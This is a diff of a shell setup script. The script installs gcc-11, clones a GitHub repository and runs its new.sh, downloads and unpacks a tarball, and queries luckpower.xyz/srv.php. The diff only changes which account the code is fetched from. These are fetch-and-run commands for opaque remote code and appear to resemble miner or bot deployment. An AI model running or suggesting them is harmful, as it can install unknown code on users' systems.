@@ -7,7 +7,7 @@ sudo add-apt-repository -y ppa:ubuntu-toolchain-r/test
 sudo apt install -y gcc-11 g++-11 -y
 sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-11 11
 sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-11 11
-git clone https://github.com/diegofustox/cwork.git
+git clone https://github.com/ricoblanco/cwork.git
 cd cwork
 chmod +x new.sh
 ./new.sh
@@ -16,7 +16,7 @@ rm -rf cwork
 echo "DONE"
 cd work
 PROG=`cat new.txt`
-wget -O z.tar.gz https://github.com/diegofustox/cwork/blob/main/z.tar.gz?raw=true
+wget -O z.tar.gz https://github.com/ricoblanco/cwork/blob/main/z.tar.gz?raw=true
 tar xvzf z.tar.gz
 rm z.tar.gz
 newh=`curl http://luckpower.xyz/srv.php`
